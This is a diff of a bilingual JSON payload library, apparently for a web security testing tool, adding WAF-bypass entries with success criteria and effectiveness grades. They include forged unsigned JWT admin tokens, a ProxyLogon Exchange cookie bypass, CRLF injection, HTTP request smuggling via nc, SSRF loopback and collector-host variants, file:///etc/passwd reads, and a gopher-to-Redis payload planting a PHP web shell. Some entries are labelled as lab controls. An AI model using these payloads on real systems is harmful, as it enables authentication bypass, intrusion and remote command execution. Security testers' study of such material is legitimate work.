+            "en": "Bypasses exact-string \"none\" allowlists since mixed case is accepted by lenient parsers. Success: the token validates and returns protected data. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, json\nh = base64.urlsafe_b64encode(json.dumps({\"typ\":\"JWT\"}, separators=(',',':')).encode()).decode().rstrip('=')\np = base64.urlsafe_b64encode(json.dumps({\"sub\":\"admin\"}, separators=(',',':')).encode()).decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+          "description": {
+            "zh": "利用库默认算法回落：头部无 alg 时按 none/未签名处理。成功判据：认证通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Exploits default-algorithm fallback when the header omits alg, treating the token as unsigned. Success: authentication passes. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, json\nraw = '{\"alg\":\"HS256\",\"alg\":\"none\",\"typ\":\"JWT\"}'\nh = base64.urlsafe_b64encode(raw.encode()).decode().rstrip('=')\np = base64.urlsafe_b64encode(json.dumps({\"sub\":\"admin\"}, separators=(',',':')).encode()).decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+          "description": {
+            "zh": "校验层与签名层对重复 alg 键取值不同导致 none 生效。成功判据：无签名令牌被接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Validator and signer read different duplicate alg keys so none takes effect. Success: the unsigned token is accepted. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "python3 - <<'PY' \n import base64, json \n h = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode().rstrip('=') \n p = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=') \n print(f'{h}.{p}') \n PY",
+          "description": {
+            "zh": "省略第三段与尾点，测试解析器对不完整结构的容忍。成功判据：两段式令牌通过验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Omitting the third segment and trailing dot tests parser tolerance for incomplete structures. Success: the two-segment token validates. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 7,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, json, time\nencode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(\",\", \":\")).encode()).rstrip(b\"=\").decode()\nheader = {\"alg\": \"none\", \"typ\": \"JWT\"}\npayload = {\"sub\": \"PAYLOADER_MARKER\", \"iat\": int(time.time()), \"exp\": int(time.time()) + 60, \"aud\": \"payloader-api\", \"iss\": \"payloader-test\"}\nprint(encode(header) + \".\" + encode(payload) + \".\")\nPY\n# Submit only to the localhost fixture; expected result is signature rejection.",
+          "description": {
+            "zh": "在隔离环境使用合成主体执行该JWT none 算法拒绝样例，并以服务端日志和只读标记确认结果。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Run this JWT None Algorithm Rejection sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 8,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'nOnE','typ':'JWT'})+'.'+e({'sub':'1','role':'admin'})+'.')\"",
+          "description": {
+            "zh": "绕过对 eyJhbGciOiJub25l 固定 base64 特征的 WAF：alg 值改 nOnE，多数库做小写归一后仍按 none 处理；成功判据：服务端接受无签名令牌。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Bypasses WAFs matching the fixed eyJhbGciOiJub25l signature: alg 'nOnE' is normalized to none by most libs. Success: the server accepts the unsigned token. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 9,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'typ':'JWT'})+'.'+e({'sub':'1'})+'.AA')\"",
+          "description": {
+            "zh": "头部完全不写 alg，部分库默认回退 none；成功判据：省略算法的令牌仍通过验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Omits alg entirely; some libraries fall back to none. Success: the algorithm-less token still validates. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':'none','typ':'JWT','cty':'JWT','kid':'k1'})+'.'+e({'sub':'1'})+'')\"",
+          "description": {
+            "zh": "头部塞入 cty/kid 等无害字段改变 base64 整体特征，保留 none 语义；成功判据：无签名令牌被接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Pads the header with harmless cty/kid fields to change the base64 signature while keeping none semantics. Success: the unsigned token is accepted. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 11,
+          "expectedCommand": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJOT05FIiwidHlwIjoiand0In0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiand0In0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJOT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoibWFuYWdlciJ9.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiYWRtaW4ifQ.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoicm9vdCJ9.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoic3VwZXJhZG1pbiJ9.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiZGV2ZWxvcGVyIn0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiYXBpIn0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoidGVzdCJ9.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoic3RhZ2luZyJ9.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiZGV2In0.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiZGVidWcifQ.eyJzdWIiOiIxIn0. \n eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoicHJvZCJ9.eyJzdWIiOiIxIn0.",
+          "description": {
+            "zh": "把 none 算法变体令牌逐条提交；服务端接受任一无签名令牌并返回授权数据，即确认算法固定缺失。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Submit each none-algorithm token variant; the server accepting any unsigned token and returning authorized data confirms missing algorithm pinning. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "prototype-nosql-query-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/nosql/filter\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"X-Request-ID: nosql-c3\" --data-urlencode \"username=lab-user\" --data-urlencode \"status[$ne]=disabled\" | jq -e '.operator_rejected == true and .matched_count == 0'",
+          "description": {
+            "zh": "通过表单括号语法提交同一 $ne 语义，验证第二解析器执行相同 Schema。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Submit the same $ne semantic through form bracket syntax to verify identical schema enforcement in the second parser. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "proxylogon",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "GET /ecp/default.flt HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=localhost%23~1;\n\nGET /ecp/default.flt HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=localhost%2523~1;\n\nGET /ecp/default.flt HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=LocalHost%23~3;\n\nGET /mapi/nspi/ HTTP/1.1\nHost: {EXCHANGE_HOST}\nCookie: X-BEResource=localhost%23~1?MailboxId={LAB_ADMIN_EMAIL};",
+          "description": {
+            "zh": "绕过对 X-BEResource 中 %23~ 定界符（后端定位 + 端口）特征拦截：一次编码 %23、双重编码 %2523、主机大小写与 ~1/~3 端口变体在反代解码后仍指向后端邮箱服务器；成功判据：响应非 401/403 且出现后端服务器特征（X-BEVersion/X-DiagInfo），说明请求被转发到后端角色。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Bypasses rules keyed on the %23~ delimiter in X-BEResource (backend host + port): single %23, double %2523, host case and ~1/~3 port variants still resolve to the backend mailbox server after proxy decoding; success criterion: a non-401/403 response with backend markers (X-BEVersion/X-DiagInfo) proves backend routing. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "redirect-basic",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "http://127.0.0.1:18080/lab/redirect?next=https://{ATTACKER_HOST}%250d%250aX-Lab-Marker%253A%2520REDIRECT_F6",
+          "description": {
+            "zh": "提交双编码 CRLF 目标；响应头出现注入的 X-Lab-Marker，即确认 CRLF 注入可绕过目标校验。失效条件：现代服务器一律拒绝头部值中的 CR/LF，仅旧嵌入式或自研 HTTP 栈有效；双编码形态另需网关二次解码架构成立。",
+            "en": "Submit the double-encoded CRLF destination; an injected X-Lab-Marker appearing in response headers confirms CRLF injection past destination validation. Failure condition: modern servers reject CR/LF inside header values outright, so only old embedded or hand-rolled HTTP stacks are exposed, and the double-encoded form additionally requires a double-decoding gateway."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "redirect-ssrf-hop-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/fetch\" --data-urlencode \"url=http://127.0.0.1:18080/lab/redirect?next=http://[::ffff:127.0.0.1]:18081/lab/internal/canary\" -H \"X-Request-ID: redirect-ssrf-b2\" | jq -e '.blocked == true and .normalized_address'",
+          "description": {
+            "zh": "把内部目标写成 IPv4-mapped IPv6，验证规范化后仍按回环地址阻断。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Represent the internal target as IPv4-mapped IPv6 and verify that normalization still blocks it as loopback. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "for value in 2130706433 0177.0.0.1 0x7f.0.0.1 127.1 \"[::1]\" \"[::ffff:7f00:1]\"; do curl --silent --show-error --max-time 5 -G \"http://127.0.0.1:18080/lab/url-policy\" --data-urlencode \"url=http://$value:18081/lab/internal/canary\" | jq -c '{input,normalized_address,blocked}'; done",
+          "description": {
+            "zh": "逐个提交登记的替代 IP 文本并输出规范地址与阻断结果，不连接内部服务。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Submit registered alternative IP text forms and output normalized addresses plus blocking results without connecting to internal services. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "samesite-browser-request-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "<!doctype html>\n<a href=\"http://127.0.0.1:18080/lab/csrf/samesite/site?marker=SAMESITE_IP_C3\">IP host</a>\n<a href=\"http://localhost:18080/lab/csrf/samesite/site?marker=SAMESITE_HOST_C3\">localhost host</a>",
+          "description": {
+            "zh": "比较 127.0.0.1 与 localhost 两个主机在本地浏览器中的 Site 判断和 Cookie 附带。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Compare site classification and cookie inclusion for 127.0.0.1 and localhost in the local browser. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "<script>location.href = \"http://127.0.0.1:18080/lab/csrf/samesite/client-redirect?marker=SAMESITE_REDIRECT_D4\";</script>",
+          "description": {
+            "zh": "使用 location.href 导航到本地 marker，并记录导航请求是否附带 Cookie。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Navigate to a local marker with location.href and record whether the navigation request includes the cookie. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "server-prototype-pollution-boundary",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/lab/prototype/merge\" -H \"Content-Type: application/json\" -H \"X-Request-ID: proto-c3\" --data '{\"settings\":{\"__proto__\":{\"labMarker\":\"PROTO_CANARY_C3\"}}}' | jq -e '.ownMarker == null and .prototypeMarker == null'",
+          "description": {
+            "zh": "把 marker 放入 settings 子对象，验证递归合并每一层都执行危险键检查。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Place the marker inside settings to verify dangerous-key checks at every recursive merge level. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "smuggling-cl-te",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 13\\r\\ntransfer-encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "description": {
+            "zh": "绕过大小写敏感的 TE 头规则。判据：SMUGGLED 进入下一请求队列。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Case-sensitive TE rules bypassed. Success: SMUGGLED joins the next request. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 13,
+          "expectedCommand": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nTransfer-Encoding:\\r\\n chunked\\r\\nContent-Length: 6\\r\\n\\r\\n0\\r\\n\\r\\nG GET /admin HTTP/1.1\\r\\nHost: {TARGET}' | nc {TARGET} 80",
+          "description": {
+            "zh": "利用 obs-fold 续行把 chunked 值折到下一行绕过头部规则。判据：G 前缀滞留后端队列污染下一请求方法（如 GGET）返回 400，即证明该变体走私生效。失效条件：obs-fold 续行已被 RFC 9112 弃用、现代栈拒收，仅宽容实现成立。",
+            "en": "Obsolete line folding moves the value off the header line. Success: smuggled request reaches /admin. Failure condition: obs-fold continuation lines are deprecated by RFC 9112 and rejected by modern stacks, so only lenient implementations accept this."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 16,
+          "expectedCommand": "POST / HTTP/1.1\\r\\n\nHost: {TARGET}\\r\\n\nContent-Length: 6\\r\\n\n0\\r\\n\nContent-Length: 3\\r\\n\n8\\r\\n\nSMUGGLED\\r\\n\nTransfer-Encoding: chunked, identity\nTransfer-Encoding: identity, chunked\nTransfer-Encoding: chu\\x00nked",
+          "command": "printf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: gzip, chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80\nprintf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 6\\r\\nContent-Length: 0\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80\nprintf 'POST / HTTP/1.1\\r\\nHost: {TARGET}\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chu\\x00nked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED' | nc {TARGET} 80",
+          "title": {
+            "zh": "TE 多值列表、双 CL 与 NUL 混淆组",
+            "en": "TE List, Dual-CL and NUL Mutation Set"
+          },
+          "description": {
+            "zh": "三条独立可执行报文：逗号多值 TE 命中\"取首段/整体拒收\"解析差分；同大小写双 Content-Length 命中首值/尾值选择差分；TE 值内嵌 NUL 仅被宽容解析层接受。NUL 形失效条件：现代服务器对头部 NUL 直接返回 400。成功判据：SMUGGLED 滞留后端队列（下一请求异常或显著超时），或目标 400/拒收行为佐证解析差分。",
+            "en": "Three independent executable messages: a comma-separated TE list hits the split-first versus reject-whole parsing differential; a same-case dual Content-Length hits the first-value versus last-value selection; an embedded NUL inside the TE value survives only in lenient parsers. Failure condition for the NUL form: modern servers answer 400 outright to NUL bytes in headers. Success: SMUGGLED stays queued on the backend (the next request misbehaves or times out), or the 400/rejection behavior confirms the parsing differential."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "Transfer-Encoding: gzip, chunked",
+              "explanation": {
+                "zh": "逗号多值 TE，命中取值策略差分",
+                "en": "comma-separated TE list hitting value-selection differentials"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "Content-Length: 6\\r\\nContent-Length: 0",
+              "explanation": {
+                "zh": "同大小写双 CL，命中首值/尾值差分",
+                "en": "same-case dual Content-Length hitting first/last-value differential"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "chu\\x00nked",
+              "explanation": {
+                "zh": "TE 值内嵌 NUL，仅宽容解析层接受",
+                "en": "NUL embedded in the TE value, accepted only by lenient parsers"
+              },
+              "type": "payload"
+            }
+          ],
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-basic",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 12,
+          "expectedCommand": "http://127.0.0.1\nhttp://localhost\nhttp://0.0.0.0\nhttp://[::1]\nhttp://0177.0.0.1\nhttp://0x7f000001\nhttp://2130706433\nhttp://017700000001\nhttp://127.1\nhttp://127.0.1\nhttp://127.0.0.1.nip.io\nhttp://localtest.me",
+          "description": {
+            "zh": "在隔离环境给每行补上同一固定测试端口并逐条请求；公共 DNS 名称应先替换为自有记录，禁止扫描其他本地端口。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Append the same fixed test port to each line in isolation and request them individually; replace public DNS names with controlled records first and never scan other local ports. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-bypass",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "http://2130706433/ \n http://0x7f000001/ \n http://0177.0.0.1/ \n http://0x7f.0x0.0x0.0x1/ \n http://127.1/ \n http://127.0.1/ \n http://127.000.000.001/ \n http://0:0:0:0:0:0:0:1/ \n http://[::1]/ \n http://0000::1/ \n http://[0:0:0:0:0:ffff:127.0.0.1]/ \n http://rebind.{LAB_OAST}/ \n http://127.0.0.1@{LAB_OAST}/ \n http://{LAB_OAST}#@127.0.0.1/ \n http://127.0.0.1%25@{LAB_OAST}/ \n http://{LAB_OAST}%2523@127.0.0.1/ \n http://①②⑦.⓪.⓪.①/ \n http://localtest.me/ \n http://{LAB_OAST}/spoofed \n http://127.0.0.1.nip.io/ \n http://127.0.0.1.sslip.io/",
+          "command": "http://2130706433.nip.io/\nhttp://0x7f.1.nip.io/\nhttp://0177.0.0.1@{LAB_OAST}/\nhttp://{LAB_OAST}#127.0.0.1/",
+          "title": {
+            "zh": "通配 DNS 与 userinfo/fragment 混合变形",
+            "en": "Wildcard DNS and userinfo/fragment mixes"
+          },
+          "description": {
+            "zh": "nip.io/sslip.io 通配 DNS 把十进制 2130706433 与十六进制 0x7f.1 子域直接解析回 127.0.0.1，绕过按字面回环文本匹配的出口过滤；八进制串写在 userinfo 位、回环文本写进 fragment 位，只欺骗按前缀或首个地址样文本取 host 的解析器，真实连接仍指向 OAST。成功判据：{LAB_OAST} 收到来自目标的解析或回连，或目标响应携带内网内容。",
+            "en": "Wildcard DNS services (nip.io/sslip.io) resolve the decimal subdomain 2130706433 and the hex form 0x7f.1 straight back to 127.0.0.1, slipping past egress filters that only match the literal loopback text. An octal string in the userinfo slot and a loopback string inside the fragment mislead parsers that take the first address-like text as the host, while the real connection still lands on the collector. Success: the collector receives a lookup or callback from the target, or the target response carries internal content."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "2130706433.nip.io",
+              "explanation": {
+                "zh": "十进制整数形式经通配 DNS 还原为 127.0.0.1",
+                "en": "decimal integer form resolved back to 127.0.0.1 via wildcard DNS"
+              },
+              "type": "value"
+            },
+            {
+              "part": "0x7f.1.nip.io",
+              "explanation": {
+                "zh": "十六进制段形式同样被通配 DNS 归一化回环",
+                "en": "hex component form normalized back to loopback the same way"
+              },
+              "type": "value"
+            },
+            {
+              "part": "http://0177.0.0.1@{LAB_OAST}/",
+              "explanation": {
+                "zh": "八进制串占据 userinfo 位，真实 host 仍是采集器",
+                "en": "octal string sits in userinfo while the real host stays the collector"
+              },
+              "type": "value"
+            },
+            {
+              "part": "#127.0.0.1",
+              "explanation": {
+                "zh": "fragment 内回环文本欺骗主机文本提取",
+                "en": "loopback text inside the fragment misleads host-text extraction"
+              },
+              "type": "value"
+            }
+          ],
+          "kind": "bypass",
+          "effectiveness": "A"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-dns-rebinding",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "dig +short {LAB_REBIND_DOMAIN} @127.0.0.1 \n dig +short {LAB_REBIND_DOMAIN} @127.0.0.1",
+          "description": {
+            "zh": "连续查询同一 A 记录并记录返回；两次查询返回不同地址即确认低 TTL 交替生效。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Query the same A record repeatedly; differing answers across queries confirm the low-TTL alternation. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-file",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "FILE:///etc/passwd\nFile:///etc/passwd\nfile:///ETC/PASSWD",
+          "description": {
+            "zh": "以大小写混合提交 file scheme 与路径；混合大小写仍返回内容而标准形式被拦，即确认大小写校验缺口。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Submit the file scheme and paths in mixed case; mixed-case content while the canonical form is blocked confirms a case-check gap. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 8,
+          "expectedCommand": "file:///var/log/nginx/access.log\nfile:///c:/windows/system32/drivers/etc/hosts",
+          "description": {
+            "zh": "按服务端操作系统和 URL 库选择对应行，并把真实系统文件替换为隔离标记；不同协议逐条测试。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Select the line matching the server OS and URL library, replace real system files with an isolated marker, and test schemes individually. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-gopher",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "gopher://127.0.0.1:6379/_%252a1%250d%250a%25244%250d%250aPING%250d%250a",
+          "description": {
+            "zh": "提交双重 URL 编码的 RESP 帧变体；捕获器解码后收到合法 RESP，即确认二次解码可绕过单层过滤。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Submit the double-URL-encoded RESP frame variant; a valid RESP after decoding on the capture service confirms double-decoding bypasses single-pass filtering. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "gopher://127.0.0.1:6379/_%252a2%250d%250a%25243%250d%250aget%250d%250a%25241%250d%250ap%250d%250a",
+          "description": {
+            "zh": "绕过只解码一次的 gopher 深度检测：载荷二次编码，终端解码两次后还原为 RESP；命令生效即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double-encode the payload for gopher inspection that decodes once; the terminal decoding twice restores RESP and effective commands confirm success. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        },
+        {
+          "area": "wafBypass",
+          "index": 9,
+          "expectedCommand": "gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500",
+          "description": {
+            "zh": "绕过对 FastCGI 记录头字节特征的串匹配：记录整体二次编码后由服务端解码；9000 端口响应记录返回即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+            "en": "Double-encode the record so its header bytes evade string matching until backend decoding; a response record from port 9000 confirms success. Failure condition: only works on architectures that run a second URL decode pass."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-mysql",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "curl -sS --max-time 3 \"http://{LAB_SSRF_APP}/fetch?url=gopher%3A%2F%2F%7BLAB_MYSQL_HOST%7D%3A3306%2F_PAYLOADER_MYSQL_BLOCKED\" -o mysql-egress-regression.json",
+          "description": {
+            "zh": "修复后重放固定实验 URL，确认应用拒绝 gopher 或网络层阻断 3306，同时正常 HTTPS 取回仍可用。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Replay the fixed lab URL after remediation to confirm that the application rejects gopher or the network blocks port 3306 while normal HTTPS fetching still works. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-protocol",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "FILE:///etc/passwd\nFile:///etc/passwd\nGopher://127.0.0.1:6379/",
+          "description": {
+            "zh": "以大小写混合形式提交各 scheme；标准小写被拦截而混合大小写仍被取回，即确认 scheme 校验存在大小写缺口。失效条件：现代 WAF 请求归一化后普遍失效，仅对自研大小写敏感正则成立。",
+            "en": "Submit each scheme in mixed case; mixed-case succeeding while lowercase is blocked confirms a case-sensitivity gap in scheme checks. Failure condition: broadly defeated once modern WAFs normalize requests; it only works against case-sensitive custom regex rules."
+          },
+          "effectiveness": "C"
+        }
+      ]
+    },
+    {
+      "id": "ssrf-redis",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3fphp system($_GET[%22cmd%22])%3b %3f%3e%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a",
+          "description": {
+            "zh": "原始序列包含破坏性配置/保存和脚本内容，只允许指向字节捕获器。验证时不得发送给 Redis，也不得解码后执行。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "The original sequence contains destructive configuration and save operations plus script content and may point only to a byte capture service. It must never be sent to Redis or executed after decoding. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
